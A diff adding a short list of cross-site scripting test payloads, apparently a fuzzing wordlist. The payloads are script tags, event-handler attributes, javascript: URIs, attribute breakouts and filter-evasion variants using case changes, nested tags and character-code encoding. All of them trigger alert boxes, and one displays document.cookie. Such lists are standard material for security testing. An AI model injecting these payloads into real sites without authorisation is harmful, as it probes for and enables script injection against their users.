@@ -1,0 +1,20 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<input onfocus=alert(1) autofocus>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=`alert(1)`>
